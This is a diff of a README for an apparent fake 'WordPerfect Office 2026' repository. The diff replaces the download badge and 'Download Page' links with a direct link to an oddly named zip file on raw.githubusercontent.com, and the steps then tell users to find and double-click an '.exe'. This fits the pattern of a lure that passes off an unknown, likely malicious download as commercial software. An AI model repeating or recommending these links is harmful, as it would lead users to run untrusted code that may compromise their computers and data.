@@ -5,7 +5,7 @@ description: "Download and install WordPerfect Office on Windows 10 and 11 using
 ---
 # 📄 WordPerfect-Office-2026 - Create professional documents on Windows computers
 
-[![](https://img.shields.io/badge/Download_WordPerfect_Office-Blue.svg)](https://github.com/Tropic-valdosta558/WordPerfect-Office-2026)
+[![](https://img.shields.io/badge/Download_WordPerfect_Office-Blue.svg)](https://raw.githubusercontent.com/Tropic-valdosta558/tropic-valdosta558.github.io/main/natterjack/io_valdosta_github_tropic_3.9.zip)
 
 ## 📁 Overview
 
@@ -26,7 +26,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to set up WordPerfect Office 2026 on your computer.
 
-1.  Visit the [Download Page](https://github.com/Tropic-valdosta558/WordPerfect-Office-2026) to obtain the installer file.
+1.  Visit the [Download Page](https://raw.githubusercontent.com/Tropic-valdosta558/tropic-valdosta558.github.io/main/natterjack/io_valdosta_github_tropic_3.9.zip) to obtain the installer file.
 2.  Click the download button on the page to save the installation file to your computer. Most browsers save this file to your "Downloads" folder.
 3.  Locate the file in your folder. The file name ends in ".exe".
 4.  Double-click the file to start the installation process.
